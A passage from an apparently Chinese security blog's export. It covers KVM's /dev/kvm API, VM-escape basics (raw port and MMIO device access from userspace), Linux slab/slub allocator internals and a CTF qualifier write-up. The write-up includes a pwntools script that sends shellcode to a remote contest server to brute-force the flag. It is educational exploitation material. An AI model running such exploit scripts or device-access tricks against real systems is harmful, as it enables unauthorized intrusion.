    <content type="text"><![CDATA[概览kvm(kernel-based virtual machine)是一个开源软件,是x86架构硬件支持虚拟化技术(如Intel-VT或AMD-V)的Linux实现,它包含一个为处理器提供底层虚拟化的可加载的核心模块kvm.ko(kvm-intel.ko或kvm-amd.ko).该内核模块使得Linux变成了一个Hypervisor.Linux-2.6.20以上的内核均包含了kvm核心. kvm所支持的功能. CPU和内存超分(Overcommit). 半虚拟化I/O(virtio). 热插拔(cpu,块设备,网络设备等). 对称多处理(Symmetric Multi-Processing,SMP). 实时迁移(Live Migration). PCI设备直接分配和单根I/O虚拟化(SR-IOV). 内核同页合并(KSM). NUMA(Non-Uniform Memory Access,非一致存储访问结构). 配合kvm使用的软件. libvirt:操作和管理kvm虚拟机的虚拟化API,使用C语言编写,可以由Python,Ruby等语言调用.可以操作包括kvm,vmware,XEN,Hyper-v,LXC等Hypervisor. virsh:基于libvirt的命令行工具(CLI). virt-Manager:基于libvirt的GUI工具. virt-v2v:虚拟机格式迁移工具. virt-install:创建kvm虚拟机的命令行工具. virt-viewer:连接kvm虚拟机屏幕的工具. virt-clone:kvm虚拟机克隆工具. virt-*系列工具. kvm不提供硬件虚拟化操作,其I/O操作等都借助qemu来完成. /dev/kvm123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;err.h&gt;#include &lt;fcntl.h&gt;#include &lt;linux/kvm.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;int main() &#123; int kvm, vmfd, vcpufd, ret; const uint8_t code[] = &#123; 0xba, 0xf8, 0x03, /* mov $0x3f8, %dx */ 0x00, 0xd8, /* add %bl, %al */ 0x04, '0', /* add $'0', %al */ 0xee, /* out %al, (%dx) */ 0xb0, '\n', /* mov $'\n', %al */ 0xee, /* out %al, (%dx) */ 0xf4, /* hlt */ &#125;; uint8_t * mem; struct kvm_sregs sregs; size_t mmap_size; struct kvm_run * run; //打开KVM设备 kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC); //获取KVM设备版本 ret = ioctl(kvm, KVM_GET_API_VERSION, NULL); //创建虚拟机 vmfd = ioctl(kvm, KVM_CREATE_VM, (unsigned long)0); //为虚拟机申请内存,并将代码(镜像)加载到虚拟机内存中 mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); memcpy(mem, code, sizeof(code)); //页表空间的前4K是留给页表目录,所以客户机物理地址从0x1000开始 struct kvm_userspace_memory_region region = &#123; .slot = 0, .guest_phys_addr = 0x1000, .memory_size = 0x1000, .userspace_addr = (uint64_t)mem, &#125;; //设置KVM的内存区域 ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region); //创建虚拟CPU vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (unsigned long)0); //获取KVM运行时结构的大小 ret = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, NULL); mmap_size = ret; if (mmap_size &lt; sizeof(*run)) errx(1, "KVM_GET_VCPU_MMAP_SIZE unexpectedly small"); //将kvm_run与vcpu做关联，这样能够获取到kvm的运行时信息 run = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, 0); if (!run) err(1, "mmap vcpu"); //获取特殊寄存器 ret = ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs); //设置代码段为0 sregs.cs.base = 0; sregs.cs.selector = 0; //设置特殊寄存器 ret = ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs); //设置代码的入口地址,如果是正式的镜,rip的值应该是类似引导扇区加载进来的指令的地址 struct kvm_regs regs = &#123; .rip = 0x1000, .rax = 2, .rbx = 2, .rflags = 0x2, &#125;; ret = ioctl(vcpufd, KVM_SET_REGS, &amp;regs); //qemu-kvm会用一个线程来执行这个vCPU并加载指令 while (1) &#123; //运行虚拟机 ret = ioctl(vcpufd, KVM_RUN, NULL); //获取虚拟机退出原因 switch (run-&gt;exit_reason) &#123; case KVM_EXIT_HLT: puts("KVM_EXIT_HLT"); return 0; ////代码中调用了out指令,vmx模式下不允许执行这个操作,所以将操作权切换到了宿主机,切换的时候会将上下文保存到VMCS寄存器 case KVM_EXIT_IO: if (run-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp; run-&gt;io.size == 1 &amp;&amp; run-&gt;io.port == 0x3f8 &amp;&amp; run-&gt;io.count == 1) putchar(*(((char *)run) + run-&gt;io.data_offset)); else errx(1, "unhandled KVM_EXIT_IO"); break; case KVM_EXIT_FAIL_ENTRY: errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx", (unsigned long long)run-&gt;fail_entry.hardware_entry_failure_reason); case KVM_EXIT_INTERNAL_ERROR: errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x", run-&gt;internal.suberror); default: errx(1, "exit_reason = 0x%x", run-&gt;exit_reason); &#125; &#125;&#125;]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-escape-pwn-VM逃逸基础]]></title>
    <url>%2Fposts%2Fe0ed7de8%2F</url>
    <content type="text"><![CDATA[未完成 0x00虚拟机是指一种特殊的软件,依靠某种环境(操作系统)运行,同时又作为其他软件的运行环境.简单说虚拟机是计算机系统的仿真器,通过软件模拟具有完整硬件系统功能的,运行在一个完全隔离环境中的完整计算机系统,能提供物理计算机的功能. 对于虚拟机逃逸来说,其实就是要攻击虚拟机管理程序hypervisor.通常把主机环境称为host,虚拟机环境称为guest. 常见的漏洞形式Device在qemu中新实现一种设备并引入漏洞,guest通过与设备进行交互进行漏洞利用.在host上使用qemu-system-x86_64 -device help查看qemu支持的设备.也可以boot到guest之后使用lspci -nvv来查看pci设备的具体信息. Linux kernel与设备通信有PIO,MMIO,DMA等形式,通常kernel会实现一套driver并在内核态与device交互,再开放API供用户态程序使用.但其实在用户态也是可以直接访问到设备的. PIOCPU执行in/out指令来向I/O端口发送数据.cat /proc/ioports能够看到目前port的一些信息和它们对应的设备. in/out指令是特权指令,一般只有在Ring 0时才能执行,linux内核提供了inb/outb/inw/outw/inl/outl,用于向port发送不同长度的数据. 在linux中还可以通过iopl,ioperm这两个系统调用对port的权能进行设置. 12#include &lt;sys/io.h&gt;int ioperm(unsigned long from, unsigned long num, int turn_on); ioperm可以将from之后的num个port打开供用户态程序使用,当在用户态执行in/out对这些port进行读写时不会触发fault.这个调用需要进程是root权限或者具有CAP_SYS_RAWIO权能. 另外,还可以通过打开/dev/port这个文件,再lseek到对应port的offset进行读写,同样可以实现PIO.如果没有/dev/port文件,可以使用mknod -m 660 /dev/port c 1 4来创建. MMIO另一种进行交互的方式是使用MMIO,CPU将一部分设备的寄存器映射到一段特殊的物理内存地址,当进行访存时就相当于对这些寄存器进行操作. cat /proc/iomem能够看到与I/O相关的一些内存地址信息. 通过kernel提供的sysfs,可以直接映射出设备对应的内存,具体方法是打开类似/sys/devices/pci0000:00/0000:00:04.0/resource0的文件,并用mmap将其映射到进程的地址空间,就可以对其进行读写了. 这里的设备号0000:00:04.0是需要事先在/proc/iomem中看好的.内存读写会触发到qemu内设备的mmio处理函数(一般会叫xxxx_mmio_read/xxxx_mmio_write),传入的参数是写入的地址偏移和具体的值. 在qemu这边,需要对这块内存区域用memory_region_init_io进行注册,传入MemoryRegionOps结构,提供相应的读写处理函数. 另外,还可以通过打开/dev/mem这个文件直接操作物理内存,mmap设备对应的地址进行读写,也是相同的效果.如果没有/dev/mem文件,可以使用mknod -m 660 /dev/mem c 1 1来创建. 交互模板. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;unsigned char* iomem;void die(const char* msg)&#123; perror(msg); exit(-1);&#125;void iowrite(uint64_t addr, uint64_t value)&#123; *((uint64_t*)(iomem + addr)) = value;&#125;uint64_t ioread(uint64_t addr)&#123; return *((uint64_t*)(iomem + addr));&#125;void iowrite32(uint64_t addr, uint32_t value)&#123; *((uint32_t*)(iomem + addr)) = value;&#125;uint32_t ioread32(uint64_t addr)&#123; return *((uint32_t*)(iomem + addr));&#125;int main(int argc, char *argv[])&#123; int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC); if (fd == -1) die("open"); iomem = mmap(0, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if (iomem == MAP_FAILED) die("mmap"); // Do something return 0;&#125; Hypercallhypercall是guest kernel向hypervisor发出的一种调用形式,广义上说像vmtools的RPCI机制使用特定I/O端口实现的也可以称之为hypercall.还有一种方式是通过一些特权指令,例如vmmcall. 即使不在kvm模式,qemu也仍然可以通过TCG实现hypercall,具体来说就是在进行binary translation时,为vmmcall定制helper函数,完成特定的功能就可以了.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>escape-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-源码分析-Linux-kernel-内存管理机制]]></title>
    <url>%2Fposts%2Fee6cd918%2F</url>
    <content type="text"><![CDATA[前言引用代码基于linux-2.6.25. 简介slab/slub是内核对象的管理机制.slab/slub暂时保留已经释放的内核对象空间以供重用,不同之处在于slab机制对内核对象的类型十分挑剔,只有类型和大小都完全一致的对象才能重用其空间.而slub只要大小差不多就可以重用同一块内存.slub机制和glibc堆分配机制是比较相像的. slab分配器在内核中会为有限的对象集(例如文件描述符和其他常见结构)分配大量内存,而对内核中普通对象初始化的时间超过对其分配和释放所需的时间. 所以不应该将内存释放回一个全局的内存池,而是将内存保持为特定对象初始化的状态.后续的内存分配不需要执行初始化函数,因为从上次释放之后,它已经处于所需的状态中了. slab就是一个使用了这种思想和其他一些思想来构建的内存分配器. slab解析slab分配器是基于对象类型进行管理的,每种对象对应一种slab.slab分配器并不丢弃释放的对象,而是对其进行管理,分配对象时会使用最近释放的对象的内存块. cache_chain是kmem_cache指针链表的表头,用来遍历查找对应对象的kmem_cache. 1static struct list_head cache_chain; slab分配器使用一个kmem_cache结构来描述一种slab. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647struct kmem_cache &#123; struct array_cache * array[NR_CPUS];//指向包含空闲对象的本地高速缓存,每个CPU有一个该结构,当有对象释放时,优先放入本地CPU高速缓存中. unsigned int batchcount;//本地高速缓存转入和转出的大批数据数量 unsigned int limit;//本地高速缓存中空闲对象的最大数目 unsigned int shared;//说明了对称多处理器系统的共享行为 unsigned int buffer_size;//对象的大小 u32 reciprocal_buffer_size;//buffer_size的倒数,加快计算 unsigned int flags; unsigned int num;//slab中对象数量 unsigned int gfporder;//slab中内存页数量 gfp_t gfpflags;//与伙伴系统交互时所提供的分配标识 size_t colour;//slab中的着色 unsigned int colour_off;//着色的偏移量 struct kmem_cache * slabp_cache; unsigned int slab_size;//slab缓冲区的大小 unsigned int dflags; void (*ctor)(struct kmem_cache *, void *); const char * name; struct list_head next;#if STATS//统计状态的变量 unsigned long num_active; unsigned long num_allocations; unsigned long high_mark; unsigned long grown; unsigned long reaped; unsigned long errors; unsigned long max_freeable; unsigned long node_allocs; unsigned long node_frees; unsigned long node_overflow; atomic_t allochit; atomic_t allocmiss; atomic_t freehit; atomic_t freemiss;#endif#if DEBUG//用于调试的变量 int obj_offset; int obj_size;#endif//用于组织slab的结点链表,此高速缓存可能在不同NUMA的结点都有slab链表 struct kmem_list3 * nodelists[MAX_NUMNODES];&#125;; array_cache记录本地cpu高速缓存的信息,用于跟踪最近释放的对象,每次分配和释放都要直接访问它,只有当其空闲内存不足时才会从nodelists中的slab中引入一部分对象到本地高速缓存中,而nodelists中的空闲对象也不足时,那么就要从伙伴系统中引入新的页来建立新的slab. 12345678struct array_cache &#123; unsigned int avail;//当前cpu可用对象数量 unsigned int limit;//最大的对象数量,当超过这个值时将对象返回给伙伴系统 unsigned int batchcount;//一次转入和转出的对象数量 unsigned int touched;//标示本地cpu最近是否被使用 spinlock_t lock;//自旋锁 void *entry[];&#125;; kmem_list3描述了slab的状态,包含三个slab队列,分别储存三种状态的slab:Full,Partial,Empty. 1234567891011121314struct kmem_list3 &#123; struct list_head slabs_partial; struct list_head slabs_full; struct list_head slabs_free; unsigned long free_objects;//空闲对象的个数 unsigned int free_limit;//空闲对象的上限 unsigned int colour_next;//即将要着色的下一个 spinlock_t list_lock;//自旋锁 struct array_cache * shared; struct array_cache * * alien; unsigned long next_reap; int free_touched;&#125;; 12345678struct slab &#123; struct list_head list;//用于将slab连入keme_list3的链表 unsigned long colouroff;//该slab的着色偏移 void * s_mem;//指向slab中的第一个对象 unsigned int inuse;//已经分配出去的对象数量 kmem_bufctl_t free;//下一个空闲对象的下标 unsigned short nodeid;//节点标识符&#125;; slab分配器的slab缓冲区结构如下. 每个slab为一个或多个连续的内存页,被划分成一个个对象.对象是从slab中进行分配和释放的基本元素. 当一个slab中的所有对象都被使用完时,就从Partial列表中移动到Full列表中. 当一个slab中的部分对象在被使用时,就从其他列表中移动到Partial列表中. 当一个slab中的所有对象都被释放之后,就从Partial列表移动到Empty列表中. Empty列表中的slab是进行回收的主要备选对象,通过此过程slab所使用的内存被返回给操作系统供其他用户使用. slab分配器还可以支持硬件缓存对齐和着色,这允许不同kmem_cache中的对象占用相同的缓存行,从而提高缓存的利用率并获得更好的性能. api函数静态定义kmem_cache结构. 1struct struct kmem_cache * my_cachep; 内核函数kmem_cache_create用来创建kmem_cache.这通常是在内核初始化或者首次加载内核模块时执行. 1struct kmem_cache * kmem_cache_create (const char * name, size_t size, size_t align, unsigned long flags, void (*ctor)(struct kmem_cache *, void *)); name为kmem_cache名称,proc文件系统(/proc/slabinfo)使用它标识一种slab. size为kmem_cache中对象大小,align参数为kmem_cache中对象必需的对齐,flags参数指定了为kmem_cache启用的选项,ctor定义了一个可选的对象构造器. 此时并没有向kmem_cache分配任何内存. 内核函数kmem_cache_destroy用来销毁kmem_cache.这通常是在内核模块被卸载时执行,调用这个函数时kmem_cache必须为空.该函数也可能会引起阻塞.因此不能在中断上下文中使用. 1void kmem_cache_destroy(struct kmem_cache * cachep); 内核函数kmem_cache_alloc函数用来从kmem_cache中获取对象,调用者提供kmem_cache指针以及一组标志. kmem_cache_alloc函数从kmem_cache中返回一个对象. 具体步骤为:首先检测其Partial列表,如果非空,就选择一个slab返回一个指向已分配但未使用的对象的指针,为空则检测Empty列表,如果非空,同上.如果也为空则只能调用kmem_getpages创建一个新的slab. kmem_cache_alloc的flags选项与kmalloc的flags选项相同. GFP_USER为用户分配内存(这个调用可能会睡眠). GFP_KERNEL从内核RAM中分配内存(这个调用可能会睡眠). GFP_ATOMIC使该调用强制处于非睡眠状态. GFP_HIGHUSER从高端内存中分配内存. 1void * kmem_cache_alloc(struct kmem_cache * cachep, gfp_t flags); 内核函数kmem_cache_zalloc与kmem_cache_alloc类似,只不过它对对象执行memset操作,用来在将对象返回调用者之前对其进行清除操作. 内核函数kmem_cache_free将一个对象释放回kmem_cache中对应的slab,调用者提供kmem_cache指针和要释放的对象. 1void kmem_cache_free(struct kmem_cache * cachep, void * objp); 内核中最常用的内存管理函数是kmalloc和kfree函数. kmalloc循环遍历可用kmem_cache来查找对应的kmem_cache,然后使用kmem_cache_alloc分配对象. kfree通过调用virt_to_cache确定对象所对应的kmem_cache,然后使用kmem_cache_free释放对象. 12void * kmalloc(size_t size, int flags);void kfree(const void * objp); kmem_cache_size函数会返回kmem_cache所管理的对象的大小. kmem_cache_name函数会返回kmem_cache的名称. kmem_cache可以通过调用kmem_cache_shrink释放其中的空闲slab进行收缩.(由内核定期自动执行的,通过kswapd,也叫做回收) 123unsigned int kmem_cache_size(struct kmem_cache * cachep);const char *kmem_cache_name(struct kmem_cache * cachep);int kmem_cache_shrink(struct kmem_cache * cachep); proc接口proc文件系统提供了一种简单的方法来监视系统中所有活动的kmem_cache,/proc/slabinfo. /proc/slabinfo除了提供一些可以从用户空间访问的可调整参数之外,还提供了有关所有kmem_cache的详细信息. 要调优特定的kmem_cache,可以简单地向/proc/slabinfo文件中以字符串的形式传递kmem_cache名称和3个可调整的参数(limit,batchcount,shared_factor). 1echo "cache_name limit batchcount shared_factor" &gt; /proc/slabinfo slob分配器对于小型的嵌入式系统来说,存在一个slab模拟层–slob.在禁用CONFIG_SLAB时,内核会使用slob分配器. slub分配器随着大规模多处理器系统和NUMA系统的广泛应用,slab分配器逐渐暴露出自身的严重不足. Linux内核2.6.22版本中引入一种新的解决方案:slub分配器. slub解析slub分配器中每个node结点的三个队列精简为了一个队列,只保留了部分空slab队列. slub分配器中每个cpu直接使用单个slab并维护自己的一个部分空链表. slub分配器中每个node结点也没有了所有cpu共享的空闲对象链表. slub分配器的kmem_cache结构相对slab而言简化了不少,而且没有了队列的相关字段. slub分配器具有缓冲区合并的功能:当内核执行绪请求创建新的缓冲区C2时,slub分配器会先搜索已创建的缓冲区,如果发现某缓冲区C1的对象大小略大于C2,则重用C1. 1234567891011121314151617181920212223242526272829303132//mm/slub.cstruct kmem_cache &#123; unsigned long flags;//标志 int size;//分配给对象的内存大小,包括下个空闲对象指针 int objsize;//对象的实际大小 int offset;//存放空闲对象指针的偏移量 int order;//当前优先分配顺序 struct kmem_cache_node local_node; int objects;//slab中对象的数量 gfp_t allocflags;//每一次分配时所使用的标志 int refcount;//重用计数器,当用户请求创建新的slub种类时,slub分配器重用已创建的相似大小的slub void (*ctor)(struct kmem_cache *, void *); int inuse;//元数据的偏移量 int align;//对齐 const char *name; struct list_head list;//所有的kmem_cache结构都会链入这个链表,链表头是slab_caches#ifdef CONFIG_SLUB_DEBUG struct kobject kobj;//sysfs文件系统在/sys中会有个slub的专用目录#endif#ifdef CONFIG_NUMA int remote_node_defrag_ratio;//该值越小,越倾向于在本结点分配对象 struct kmem_cache_node * node[MAX_NUMNODES];//用于组织slab,分为多个节点#endif#ifdef CONFIG_SMP struct kmem_cache_cpu * cpu_slab[NR_CPUS];#else struct kmem_cache_cpu cpu_slab;#endif&#125;; 每个处理器都有一个本地活动slab,由kmem_cache_cpu结构描述. 12345678910struct kmem_cache_cpu &#123; void * * freelist;//指向下一个空闲对象 struct page * page;//cpu当前所使用的slab缓冲区描述符 int node; unsigned int offset; unsigned int objsize;#ifdef CONFIG_SLUB_STATS unsigned stat[NR_SLUB_STAT_ITEMS];#endif&#125;; 节点的组织. 123456789struct kmem_cache_node &#123; spinlock_t list_lock;//锁 unsigned long nr_partial; atomic_long_t nr_slabs;//该node中此kmem_cache的所有slab的数量 struct list_head partial;#ifdef CONFIG_SLUB_DEBUG struct list_head full;#endif&#125;; 创建处理器活动slab时,第一个空闲对象的指针被复制到kmem_cache_cpu结构的freelist字段中. 内核执行绪申请对象时,直接从所在处理器的kmem_cache_cpu结构的freelist字段获得第一个空闲对象的地址,然后更新freelist字段,使其指向下一个空闲对象.当本地活动slab没有空闲对象时,slub分配器优先从处理器所在节点的Partial队列中分配一个slab作为新的本地活动slab,其次从其它节点中分配slab. 释放对象时,如果对象属于所在处理器的活动slab 中,直接将其添加到空闲对象队列的队首,并更新freelist字段.否则的话,对象一定属于某Partial中.如果释放操作使得该Partial转变成Empty状态,则释放该slab. 虽然对象分配和释放的操作只针对处理器本地的活动slab,但是在某些特殊的情况下会为当前处理器创建新的活动slab并把原先未用完的活动slab加到NUMA节点的Partial队列中(例如,在处理器A上运行的某内核执行绪申请对象,但是A的活动slab中已经没有空闲对象,因此必须创建新的slab.但是创建slab的操作可能导致睡眠,所以当创建操作完成后该执行绪可能被调度到处理器B上,这将停止使用B原有的活动slab,并将其加入B所在节点的Partial队列中). 内核执行绪申请对象时,直接从所在处理器的kmem_cache_cpu结构的freelist字段获得第一个空闲对象的地址,然后更新freelist字段,使其指向下一个空闲对象.释放对象时,如果对象属于所在处理器的活动slab 中,直接将其添加到空闲对象队列的队首,并更新freelist字段.否则的话,对象一定属于某Partial中.如果释放操作使得该slab从Partial转变成Empty状态,则释放该slab. slub分配器的slab缓冲区结构中没有对象描述符数组,没有额外的空闲对象队列,而是重用了空闲对象自身的空间.每个空闲对象有一个指向下一个空闲对象的指针. slub的调试代码总是可用,一旦激活slab_debug选项,用户就可以很方便地选择单个或一组指定的缓冲区进行动态调试. 内核函数常常需要临时分配一块任意大小的物理地址连续的内存空间,如果请求不频繁的话,则没有必要创建单独的缓冲区.Linux内核为这种请求准备了一组特定大小的通用对象缓冲区.调用kmalloc函数就可以得到符合请求大小的内存空间,调用kfree则释放该内存空间. kmalloc工作于slub分配器之上.内核初始化时,创建一组共13个通用对象的缓冲区.kmalloc_caches数组存放了这些缓冲区的kmem_cache数据结构.由于kmem_cache数据结构是通过kmalloc来分配的,故而只能用静态分配的kmem_cache结构数组来描述通用对象的缓冲区.其中kmalloc_caches[0]代表的缓冲区专门分配kmem_cache_node结构.kmalloc_caches[1]缓冲区对象大小为64,kmalloc_caches[2]缓冲区对象大小为192,其余第i(3 ~ 12)号缓冲区对象大小为2 ^ i.如果请求分配超过物理页面大小的对象,直接调用页框分配器.为了满足老式ISA设备的需要,内核还使用DMA内存创建了13个通用对象的缓冲区,用kmalloc_caches_dma数组存放相应的kmem_cache结构. api函数为了保证内核其它模块能够无缝迁移到slab分配器,slab还保留了原有slab分配器所有的接口api函数. kmem_cache_create:创建新的缓冲区. kmem_cache_destroy:销毁缓冲区,因为存在重用缓冲区的情况,只有当kmem_cache结构的refcount字段为0时才真正销毁. kmem_cache_alloc:从处理器本地的活动slab中分配对象. kmem_cache_alloc_node:如果指定的NUMA节点与本处理器所在节点不一致,则先从指定节点上获取slab,替换处理器活动slab,然后分配对象. kmem_cache_free:释放对象.如果对象属于某Partial队列且释放操作使这个slab转变成Empty状态,则释放该slab. kmem_ptr_validate:检查给定对象的指针是否合法. kmem_cache_size:返回对象实际大小. kmem_cache_shrink:检查各个节点的Partial队列,回收实际处于Empty状态的slab,并将剩余的slab按已分配对象的数目排序. kmalloc:从通用缓冲区中分配一个对象. kmalloc_node:从通用缓冲区中分配一个属于指定NUMA节点的对象. kfree:释放一个通用对象. ksize:返回分配给对象的内存大小(可能大于对象的实际大小). slab_alloc &amp; slab_freekmem_cache_alloc和kmem_cache_alloc_node函数都是直接调用slab_alloc函数,只是kmem_cache_alloc传入的node参数为-1.kmem_cache_free则调用slab_free函数. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117//mm/slub.cstatic __always_inline void *slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node, void *addr) &#123; void * * object; struct kmem_cache_cpu * c; unsigned long flags; local_irq_save(flags); c = get_cpu_slab(s, smp_processor_id()); //获取本处理器的kmem_cache_cpu数据结构 if (unlikely(!c-&gt;freelist || !node_match(c, node))) //假如当前活动slab没有空闲对象,或本处理器所在节点与指定节点不一致,则调用__slab_alloc函数. object = __slab_alloc(s, gfpflags, node, addr, c); else &#123; //获得第一个空闲对象的指针,然后更新指针使其指向下一个空闲对象. object = c-&gt;freelist; c-&gt;freelist = object[c-&gt;offset]; stat(c, ALLOC_FASTPATH); &#125; local_irq_restore(flags); if (unlikely((gfpflags &amp; __GFP_ZERO) &amp;&amp; object)) memset(object, 0, c-&gt;objsize); return object; //返回对象地址&#125;static void *__slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node, void *addr, struct kmem_cache_cpu *c) &#123; void * * object; struct page * new; gfpflags &amp;= ~__GFP_ZERO; if (!c-&gt;page) //如果没有本地活动slab,转到new_slab获取slab goto new_slab; slab_lock(c-&gt;page); if (unlikely(!node_match(c, node))) //如果本处理器所在节点与指定节点不一致,转到another_slab goto another_slab; stat(c, ALLOC_REFILL);load_freelist: object = c-&gt;page-&gt;freelist; if (unlikely(!object)) //如果处理器活动slab没有空闲对象,转到another_slab goto another_slab; if (unlikely(SlabDebug(c-&gt;page))) goto debug; //活动slab尚有空闲对象,将slab的空闲对象队列指针复制到kmem_cache_cpu结构的freelist字段后设置为空,从此以后只从kmem_cache_cpu结构的freelist字段获得空闲对象队列信息. c-&gt;freelist = object[c-&gt;offset]; c-&gt;page-&gt;inuse = s-&gt;objects; c-&gt;page-&gt;freelist = NULL; c-&gt;node = page_to_nid(c-&gt;page);unlock_out: slab_unlock(c-&gt;page); stat(c, ALLOC_SLOWPATH); return object;another_slab: //取消当前活动slab,将其加入到所在NUMA节点的Partial队列中 deactivate_slab(s, c);new_slab: //优先从指定NUMA节点上获得一个Partial new = get_partial(s, gfpflags, node); if (new) &#123; c-&gt;page = new; stat(c, ALLOC_FROM_PARTIAL); goto load_freelist; &#125; if (gfpflags &amp; __GFP_WAIT) //开启中断,故后续创建slab操作可以睡眠 local_irq_enable(); //创建一个slab,并初始化所有对象 new = new_slab(s, gfpflags, node); if (gfpflags &amp; __GFP_WAIT) local_irq_disable(); if (new) &#123; c = get_cpu_slab(s, smp_processor_id()); stat(c, ALLOC_SLAB); if (c-&gt;page) flush_slab(s, c); slab_lock(new); SetSlabFrozen(new); c-&gt;page = new; goto load_freelist; &#125; if (!(gfpflags &amp; __GFP_NORETRY) &amp;&amp; (s-&gt;flags &amp; __PAGE_ALLOC_FALLBACK)) &#123; if (gfpflags &amp; __GFP_WAIT) local_irq_enable(); //如果内存不足,无法创建slab,调用kmalloc_large(实际调用物理页框分配器)分配对象. object = kmalloc_large(s-&gt;objsize, gfpflags); if (gfpflags &amp; __GFP_WAIT) local_irq_disable(); return object; &#125; return NULL;debug: if (!alloc_debug_processing(s, c-&gt;page, object, addr)) goto another_slab; c-&gt;page-&gt;inuse++; c-&gt;page-&gt;freelist = object[c-&gt;offset]; c-&gt;node = -1; goto unlock_out;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576////mm/slub.cstatic __always_inline void slab_free(struct kmem_cache *s, struct page *page, void *x, void *addr) &#123; void * * object = (void *)x; struct kmem_cache_cpu * c; unsigned long flags; local_irq_save(flags); c = get_cpu_slab(s, smp_processor_id()); debug_check_no_locks_freed(object, c-&gt;objsize); if (likely(page == c-&gt;page &amp;&amp; c-&gt;node &gt;= 0)) &#123; //如果对象属于处理器当前活动的slab,或处理器所在NUMA节点号不为-1(调试使用的值),将对象放回空闲对象队列 object[c-&gt;offset] = c-&gt;freelist; c-&gt;freelist = object; stat(c, FREE_FASTPATH); &#125; else //否则调用__slab_free函数 __slab_free(s, page, x, addr, c-&gt;offset); local_irq_restore(flags);&#125;static void __slab_free(struct kmem_cache *s, struct page *page, void *x, void *addr, unsigned int offset) &#123;//执行本函数表明对象所属slab并不是某个活动slab void * prior; void * * object = (void *)x; struct kmem_cache_cpu * c; c = get_cpu_slab(s, raw_smp_processor_id()); stat(c, FREE_SLOWPATH); slab_lock(page); if (unlikely(SlabDebug(page))) goto debug;checks_ok: //保存空闲对象队列的指针,将对象放回此队列,最后把已分配对象数目减一 prior = object[offset] = page-&gt;freelist; page-&gt;freelist = object; page-&gt;inuse--; if (unlikely(SlabFrozen(page))) &#123; stat(c, FREE_FROZEN); goto out_unlock; &#125; if (unlikely(!page-&gt;inuse)) //如果已分配对象数为0,说明slab处于Empty状态,转到slab_empty goto slab_empty; if (unlikely(!prior)) &#123; //如果原空闲对象队列的指针为空,说明slab原来的状态为Full,那么现在的状态应该是Partial,将该slab加到所在节点的Partial队列中. add_partial(get_node(s, page_to_nid(page)), page, 1); stat(c, FREE_ADD_PARTIAL); &#125;out_unlock: slab_unlock(page); return;slab_empty: if (prior) &#123; //如果slab状态转为Empty,且先前位于节点的Partial队列中,则将其剔出并释放所占内存空间. remove_partial(s, page); stat(c, FREE_REMOVE_PARTIAL); &#125; slab_unlock(page); stat(c, FREE_SLAB); discard_slab(s, page); return;debug: if (!free_debug_processing(s, page, x, addr)) goto out_unlock; goto checks_ok;&#125;]]></content>
      <categories>
        <category>binary</category>
        <category>源码分析</category>
      </categories>
      <tags>
        <tag>Linux-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-redhat-2019-quals]]></title>
    <url>%2Fposts%2F9c3e1ec4%2F</url>
    <content type="text"><![CDATA[pwnthree利用三字节指令mov eax, [ecx];ret控制返回值,从而爆破flag. 1234567891011121314151617181920212223from pwn import *context(os="linux", arch="i386")keys = "qwertyuiopasdfghjklzxcvbnm[]\&#123;\&#125;:\"?./_+1234567890-=!@#$%^&amp;*()`~"flag = ""for i in range(32): for char in keys: r = remote("47.104.190.38", "12001") r.sendlineafter("Give me a index:\n", str(i)) r.sendafter("I like it very much!\n", asm("mov eax, [ecx];ret")) r.sendlineafter("Leave you name of size:\n", "2") r.sendafter("Tell me:\n", char) answer = int(r.recvline()) r.close() if answer == 1: print "id" + str(i) + ": " + char flag += char breakprint flag revxxcode长度为19,字符集为qwertyuiopasdfghjklzxcvbnm1234567890. 中间是tea加密. 后面有一轮异或和交换,解密脚本. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051num = 0xFA5656E7C80218233502F79120209BEFC0953A7C6B40BCCEnum_list = []while num &gt; 0: num_list.append(num % 0x100) num = num / 0x100#print num_listfor i in range(24): z = 0 if (24 - i - 1) / 3 &gt; 0: while z &lt; (24 - i - 1) / 3: num_list[24 - i - 1] = num_list[24 - i - 1] ^ 